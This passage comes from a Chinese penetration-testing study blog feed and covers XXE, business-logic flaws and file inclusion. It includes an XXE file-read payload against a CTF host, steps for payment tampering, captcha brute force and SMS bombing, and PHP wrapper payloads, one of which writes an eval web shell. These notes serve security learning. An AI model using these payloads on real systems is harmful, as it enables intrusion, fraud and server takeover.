更改类型（盲猜）</h2><p>原代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1.0/try HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:9882</span><br><span class="line">Content-Length: 36</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://web.jarvisoj.com:9882</span><br><span class="line">Referer: http://web.jarvisoj.com:9882/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;type sth!&quot;,&quot;value&quot;:&quot;own&quot;&#125;</span><br></pre></td></tr></table></figure><p>改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1.0/try HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:9882</span><br><span class="line">Content-Length: 104</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://web.jarvisoj.com:9882</span><br><span class="line">Referer: http://web.jarvisoj.com:9882/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;</span><br><span class="line">&lt;/x&gt;</span><br></pre></td></tr></table></figure><h2 id="java-webgoat"><a class="markdownIt-Anchor" href="#java-webgoat"></a> JAVA webgoat</h2><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/xxe-parser-java.png" alt="XML parser" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/XXE%E4%B8%8EXML.png&quot; alt=&quot;XXE与XML&quot; /&gt;&lt;/p&gt;
&lt;h1 id=</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="XXE" scheme="https://j3f5.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-06-03T02:40:31.000Z</published>
    <updated>2023-06-03T02:40:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603112019979.png" alt="image-20230603112019979" style="zoom:67%;" /><h1 id="水平垂直越权"><a class="markdownIt-Anchor" href="#水平垂直越权"></a> 水平垂直越权</h1><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2><ol><li>水平：A与B是同一个权限，但是A可以访问B的数据</li><li>垂直：B是高权限用户，而A是低权限，A可以访问B的数据</li><li>未授权访问：通过删除请求中的认证信息后，发起 <strong>重放攻击</strong> 仍然可以访问或者完成操作</li></ol><h2 id="挖洞关键"><a class="markdownIt-Anchor" href="#挖洞关键"></a> 挖洞关键</h2><ol><li><p>找到功能点，当然也可能不是功能点，就是刷新之后返回的一些信息，通过各种参数查询数据库啥的，抓包一个个放，然后看有什么可以利用的</p></li><li><p>抓包查看有什么地方可以修改的，例如如下<code>card_id</code>、<code>uid</code>等等都是可以改的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /json.php?card_id=20128880322 HTTP/1.1</span><br><span class="line">Host: 124.70.64.48:47325</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://124.70.64.48:47325/user_info.php</span><br><span class="line">Cookie: PHPSESSID=2a14ujvvjk9puum9qvpelkaae2; uid=test; mid=6927071f788211ee17211be0b89ef1e6</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></li><li><p>去找你想要相关User的信息，一般可以通过头像的命名方式之类的，与card_id有关系的命名，然后得到一些信息。改一下就重新发包，观察得到了什么信息。</p></li></ol><p>所以总结一下，一些Uid啥的都是很有用的，需要注意搜集</p><h2 id="水平越权操作"><a class="markdownIt-Anchor" href="#水平越权操作"></a> 水平越权操作</h2><ol><li><p>看一下A中可以实现的功能，然后，抓包。【例如：账户名Kobe，然后有个查看信息的操作】</p></li><li><p>看抓包中的参数，更改参数。【例如想查看账户Lucy的详细信息，更改<code>http://.../?name=kobe&amp;submit=...</code>中kobe变成lucy】</p><ol><li>怎么知道有Lucy这个人？信息搜集+注册框显示是否存在此用户+访问其他个人空间查看用户名</li></ol></li><li><p>如果返回成功，那就存在水平越权</p></li></ol><h2 id="垂直越权操作"><a class="markdownIt-Anchor" href="#垂直越权操作"></a> 垂直越权操作</h2><ol><li><p>先去admin界面操作并抓到包/看到相关界面（例如在普通用户界面有的按钮是灰色，然后猜解数据包的构成）</p></li><li><p>更换猜解/抓到的admin操作数据包，然后替换普通用户的cookie</p></li><li><p>如果操作成功，那就存在垂直越权漏洞</p></li></ol><p>前提条件：（获取admin的操作数据包，那么怎么来的数据包？）</p><ol><li>普通用户前端有操作界面可以抓取操作数据包</li><li>通过网站源码本地搭建模拟抓取</li><li>盲猜</li></ol><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>即：验证是产生在哪个地方的。所以：<strong>如果在访问数据包的时候有传输用户的编号，用户组编号或者类型编号，那么尝试对这个值进行修改，就是测试越权漏洞的基本。</strong></p><h3 id="前端安全造成界面"><a class="markdownIt-Anchor" href="#前端安全造成界面"></a> 前端安全造成——界面</h3><p>即前端验证是否有这个权限去执行这个操作，然后放行或者禁止。所以后端不做验证直接全盘接受，如果前端伪造，那么就会有这样的漏洞。<em>其实可以算是后端代码逻辑错误</em>，例如：php代码没有验证是什么权限，只是验证是否登录。</p><h3 id="后端安全造成数据库"><a class="markdownIt-Anchor" href="#后端安全造成数据库"></a> 后端安全造成——数据库</h3><p>通过验证usertype来确定用户权限。</p><blockquote><p>id, username, password, usertype</p><p>1, admin, 123456, 1</p><p>2, xiaodi, 365567, 2</p></blockquote><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><ol><li>secscan-authcheck：<a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></li><li>小米范：<a href="http://pan.baidu.com/s/1pLjaQKF">http://pan.baidu.com/s/1pLjaQKF</a> (privilegechecker)。他就是多个窗口，省了你切换窗口的麻烦。</li><li>Authz：Burp的插件 直接在官方那下</li></ol><h1 id="登录爆破与支付数据篡改"><a class="markdownIt-Anchor" href="#登录爆破与支付数据篡改"></a> 登录爆破与支付数据篡改</h1><h2 id="登录功能点安全问题"><a class="markdownIt-Anchor" href="#登录功能点安全问题"></a> 登录功能点安全问题</h2><h3 id="爆破测试"><a class="markdownIt-Anchor" href="#爆破测试"></a> 爆破测试</h3><p>一般来说http传输数据流量的时候是不加密传输的，而Https是加密传输的。例如用户名密码，baidu的密码就是经过加密的。但是也不绝对，https不一定对密码进行加密操作，而Http也可能对密码进行加密。</p><p>然而，它也是可以被爆破的，md5什么的可以直接爆破。</p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603163400180.png" alt="image-20230603163400180" style="zoom: 50%;" /><h3 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> cookie</h3><p>验证cookie有误，例如：</p><ol><li>【白盒】仅仅验证是否存在COOKIE且COOKIE中的USER是否有值，有的话就放行。这样是不行的。我只要伪造一个USER，随便输入什么东西就绕过了。</li><li>【黑盒】收到包，看COOKIE中的值是否是可以操作的，就随便改，碰运气</li></ol><h3 id="综合考虑"><a class="markdownIt-Anchor" href="#综合考虑"></a> 综合考虑</h3><ol><li>字典应该如何设置，是结合信息搜集还是用top100字典</li><li>验证码如何绕过，图片or数字验证码</li><li>登录次数限制</li><li>综合考虑多个问题</li></ol><h2 id="数据篡改安全"><a class="markdownIt-Anchor" href="#数据篡改安全"></a> 数据篡改安全</h2><h3 id="物品购买流程"><a class="markdownIt-Anchor" href="#物品购买流程"></a> 物品购买流程</h3><p>订购、确认信息、付款</p><h3 id="常见篡改参数"><a class="markdownIt-Anchor" href="#常见篡改参数"></a> 常见篡改参数</h3><p>商品ID、购买价格/优惠券、订单信息</p><h3 id="常见篡改方法"><a class="markdownIt-Anchor" href="#常见篡改方法"></a> 常见篡改方法</h3><p>替换支付、重复支付、最小额度支付、负数支付、溢出支付、优惠券支付…</p><p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E.png" alt="支付漏洞" /></p><p><strong>支付接口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=/wap/pay/wchatQrcodePay //微信支付</span><br><span class="line">index.php?s=/wap/pay/alipay //支付宝支付</span><br><span class="line">index.php?s=http://www.xiaodi8.com/alipay //调用其他的支付接口</span><br><span class="line">payname= pay_name=payname=_GET[‘s’];</span><br></pre></td></tr></table></figure><h1 id="找回机制与接口"><a class="markdownIt-Anchor" href="#找回机制与接口"></a> 找回机制与接口</h1><h2 id="找回机制"><a class="markdownIt-Anchor" href="#找回机制"></a> 找回机制</h2><ul><li><p><strong>客户端回显</strong>：有时候发送邮箱验证码，会通过包来发送，<strong>验证码就藏在发送包的内容</strong>中，甚至是<strong>图片标签里面就有验证码</strong></p></li><li><p><strong>Response 状态值</strong>：有时候验证完验证码后，服务器会发送Res，里面包含一个CODE，表达是否验证成功，这个时候，我们可以通过Burp拦截回显包，修改CODE值，看看时候是正确的。（当然我们得提前知道这个CODE是什么值的时候是正确的）</p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230605110748393.png" alt="image-20230605110748393" style="zoom:50%;" /></li><li><p><strong>验证码爆破</strong>：一般4位数数字验证码是可以爆破的</p></li><li><p><strong>找回流程绕过/更改找回流程</strong></p><p>通常发生在邮件/手机的验证码绕过。当发送了包，替换原号码为我们的手机号来收验证码。然后把验证码写上就行。</p><p>还有一种是，邮箱收到找回密码的URL，注意观察这个URL有一些参数值是可以改的，改了它看能不能实现跨用户的密码重置。当然，这会有其他问题出现，例如，如何去改这个参数（这个参数如何构成的）</p></li></ul><h2 id="接口攻击后面会详细"><a class="markdownIt-Anchor" href="#接口攻击后面会详细"></a> 接口攻击（后面会详细）</h2><ol><li>短信轰炸</li><li>来电轰炸</li></ol><h1 id="验证码-token与接口"><a class="markdownIt-Anchor" href="#验证码-token与接口"></a> 验证码、token与接口</h1><h2 id="验证码安全"><a class="markdownIt-Anchor" href="#验证码安全"></a> 验证码安全</h2><ul><li>分类：图片，手机或邮箱，语音，视频，操作等</li><li>原理：验证生成或验证过程中的逻辑问题</li><li>危害：账户权限泄漏，短信轰炸，遍历，任意用户操作等</li><li>漏洞：客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等</li></ul><blockquote><p>验证码识别插件工具使用 captcha-killer，Pkav_Http_Fuzz，reCAPTCHA 等</p></blockquote><h2 id="token-安全"><a class="markdownIt-Anchor" href="#token-安全"></a> token 安全</h2><p>基本上述同理，主要是验证中可存在绕过可继续后续测试 token 爆破，token 客户端回显等</p><blockquote><p>客户端访问服务器, 服务器返回一个签名的token给客户端, 服务器和客户端各自保存token。以后每次请求服务器都会携带token</p></blockquote><p><strong>token的主要作用：</strong></p><ol><li><p>防止表单重复提交</p></li><li><p>身份验证</p></li></ol><h2 id="接口安全"><a class="markdownIt-Anchor" href="#接口安全"></a> 接口安全</h2><p>调用，遍历，未授权，篡改等</p><p><strong>调用案例</strong>：短信轰炸</p><p><strong>遍历案列</strong>：UID 等遍历</p><p><strong>callback 回调 JSONP</strong> （看跨域共享~）</p><p><strong>参数篡改</strong>：墨者靶场</p><h1 id="防御措施"><a class="markdownIt-Anchor" href="#防御措施"></a> 防御措施</h1><ol><li>前后端双重检测</li></ol><h1 id="资源"><a class="markdownIt-Anchor" href="#资源"></a> 资源</h1><h2 id="涉及资源"><a class="markdownIt-Anchor" href="#涉及资源"></a> 涉及资源</h2><ol><li>爆破字典：<a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></li><li>业务逻辑文章：<a href="https://cloud.tencent.com/developer/article/2091084">https://cloud.tencent.com/developer/article/2091084</a></li></ol><h2 id="漏洞文章图"><a class="markdownIt-Anchor" href="#漏洞文章图"></a> 漏洞文章图</h2><p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603105155068.png" alt="image-20230603105155068" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603112019979.png&quot; alt=&quot;image-20230603112019979&quot; style=&quot;zoom:67%;&quot; /&gt;
&lt;h1 i</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="业务逻辑" scheme="https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>文件包含与下载读取基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-02T08:00:56.000Z</published>
    <updated>2023-06-02T08:00:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h1><p>即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，这样，如果我们能<strong>控制这些参数</strong>，就可以进行文件包含。</p><p>利用：</p><ol><li>有相关的包含函数</li><li>该函数内参数可控</li></ol><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602220540888.png" alt="image-20230602220540888" /></p><h2 id="常见代码以及脚本函数"><a class="markdownIt-Anchor" href="#常见代码以及脚本函数"></a> 常见代码以及脚本函数</h2><h3 id="造成包含的常见脚本代码"><a class="markdownIt-Anchor" href="#造成包含的常见脚本代码"></a> 造成包含的常见脚本代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include(&#x27;test.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h3 id="脚本函数"><a class="markdownIt-Anchor" href="#脚本函数"></a> 脚本函数</h3><h4 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h4><ul><li><p>include()：当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p></li><li><p>include_once()：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。</p></li><li><p>include_once()：可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题</p></li><li><p>require()：当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。</p></li><li><p>require_once()：require_once表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</p></li></ul><h2 id="检测"><a class="markdownIt-Anchor" href="#检测"></a> 检测</h2><p>这里的检测也分白盒黑盒，都差不多老三样</p><ol><li>白盒：代码审计</li><li>黑盒<ol><li>公开漏洞</li><li>漏扫工具</li><li>手工查看参数和功能点</li></ol></li></ol><h2 id="类型与绕过"><a class="markdownIt-Anchor" href="#类型与绕过"></a> 类型与绕过</h2><h3 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h3><ol><li>远程包含（RFI）</li><li>本地包含（LFI）</li></ol><h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h3><h4 id="本地有限制包含"><a class="markdownIt-Anchor" href="#本地有限制包含"></a> 本地有限制包含</h4><ol><li><p><code>%00</code>截断</p><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p></li><li><p>路径长度截断</p><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote></li></ol><p>​<img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602164350289.png" alt="image-20230602164350289" /></p><ol start="3"><li><p>点号<code>.</code>截断</p><p>条件：windows OS，点号需要长于256</p><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602164433984.png" alt="image-20230602164433984" /></p></li></ol><h4 id="远程有限制包含"><a class="markdownIt-Anchor" href="#远程有限制包含"></a> 远程有限制包含</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line">allow_url_include = On（是否允许include/require远程文件）</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个限制了包含文件的格式。但是可以绕过。</p><ol><li><p>使用<code>?</code>号：<code>www.xxx.com/include.php?filename=myfile.php?</code></p><p>即把后面的当做参数</p></li><li><p>使用<code>#(%23)</code>：<code>www.xxx.com/include.php?filename=myfile.php%23</code></p><p>即把后面的当做HTML标签</p></li><li><p>使用<code> 空格(%20)</code>：<code>www.xxx.com/include.php?filename=myfile.php%20</code></p></li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><table><thead><tr><th>-</th><th>php</th><th>java</th><th>curl(ssrf)</th><th>asp</th><th>利用</th></tr></thead><tbody><tr><td>http/https</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>gopher</td><td>√</td><td>before JDK1.7</td><td>before 7.49.0 不支持\x00</td><td>before version 3</td><td></td></tr><tr><td>ftp</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>file</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>dict</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>imap/pop3</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>rtsp</td><td>–with-curlwrappers</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>smb</td><td>–with-curlwrappers</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>smtp</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>telnet</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>ssh2</td><td>受限于allow_url_fopen</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>ogg</td><td>受限于allow_url_fopen</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>ldap</td><td>×</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>php</td><td>√</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>zlib/bzip2/zip</td><td>受限于allow_url_fopen</td><td>×</td><td>×</td><td>×</td><td></td></tr></tbody></table><h3 id="php专属伪协议"><a class="markdownIt-Anchor" href="#php专属伪协议"></a> PHP专属伪协议</h3><table><thead><tr><th>协议</th><th>allow_url_fopen</th><th>allow_url_include</th><th>用法</th></tr></thead><tbody><tr><td>file://</td><td>off/on</td><td>off/on</td><td>?file=file:///user/desktop/file.txt</td></tr><tr><td>php://filter</td><td>off/on</td><td>off/on</td><td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td>php://input</td><td>off/on</td><td>on</td><td>?file=php://input[POST DATA]  <code>&lt;?php phpinfo()?&gt;</code><br /><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602215753944.png" alt="image-20230602215753944" /><br /><strong>注：当enctype=”multipart/form-data”时，php://input是无效的。</strong><br />常用：<code>http://127.0.0.1/include.php?file=php://input&lt;br/&gt;[POST DATA部分]&lt;br/&gt;&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></td></tr><tr><td>compress.bzip2://</td><td>off/on</td><td>off/on</td><td>?file=compress.bzip2://D:/soft/phpStudy/WW/file.bz2<br />[or]<br />?file=compress.bzip2://./file.bz2</td></tr><tr><td>compress.zlib://</td><td>off/on</td><td>off/on</td><td>?file=compress.zlib//D:/soft/phpStudy/WWW/filegz<br />[or]<br />?file=compress.zlib://./file.gz</td></tr><tr><td>data://</td><td>on</td><td>on</td><td>?file=data://text/plain,<code>&lt;?php phpinfo()?&gt;</code><br />[or]<br />?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<br />也可以:<br />?file=data:text/plain,<code>&lt;?php phpinfo0?&gt;</code><br />[or]<br />?file=data:text/plain:base64,PD9waAacGhwaW5mbyapPz4=<br /><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602220146924.png" alt="image-20230602220146924" /></td></tr><tr><td>http://</td><td></td><td></td><td><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602215928728.png" alt="image-20230602215928728" /></td></tr><tr><td>filter://</td><td></td><td></td><td>php://filter/read=convert.base64-encode/resource=[文件名]<br/><a href="http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</a><br /></td></tr><tr><td>phar://</td><td></td><td></td><td>步骤：写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 再用<strong>解压函数phar解压</strong>即可：<code>?file=phar://压缩包/内部文件</code></td></tr><tr><td>zip://</td><td></td><td></td><td>相反，这个是<strong>压缩函数</strong>。用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] </code>。例如：<code>zip://xxx.png#shell.php</code></td></tr></tbody></table><h4 id="php伪协议"><a class="markdownIt-Anchor" href="#php伪协议"></a> PHP伪协议</h4><p>事实就是支持的协议和封装的协议12种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:// - 访问本地文件系统</span><br><span class="line">http:// - 访问http网站</span><br><span class="line">ftp:// - 访问FTP（s）URLS</span><br><span class="line">php:// - 访问各个输入输出流</span><br><span class="line">zlib:// - 压缩流</span><br><span class="line">data：// - 数据（RFC 2397）</span><br><span class="line">glob：// -查找匹配的文件路径模型</span><br><span class="line">ssh2：// - Secure Shell 2</span><br><span class="line">rar:// - RAR</span><br><span class="line">ogg:// - 音频流</span><br><span class="line">expect:// - 处理交互式的流</span><br></pre></td></tr></table></figure><h4 id="phpini参数设置"><a class="markdownIt-Anchor" href="#phpini参数设置"></a> php.ini参数设置</h4><p>在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。</p><ul><li>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；</li><li>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</li></ul><h2 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h2><h1 id="文件下载"><a class="markdownIt-Anchor" href="#文件下载"></a> 文件下载</h1><p>注意区别：</p><ol><li>文件被解析：文件包含</li><li>显示源代码：文件读取</li><li>提示文件下载：文件下载</li></ol><h2 id="一般链接形式与攻击思路"><a class="markdownIt-Anchor" href="#一般链接形式与攻击思路"></a> 一般链接形式与攻击思路</h2><ul><li>抓URL，看URL上有什么下载形式的URL</li><li><strong>就是在一些下载按钮那</strong>，然后你改一下下面的链接就可以下载其他文件了。例如提取下载链接：<code>http://..../?s=asdfagqrebvz==</code>是个base64，我们下载一个文件，观察其文件名，然后把后面的Base64解码，看目录，对应着文件名就可以实现任意文件下载了。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.php?file=</span><br><span class="line">data.php?file=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure><h2 id="包含参数"><a class="markdownIt-Anchor" href="#包含参数"></a> 包含参数</h2><figure class="highlight 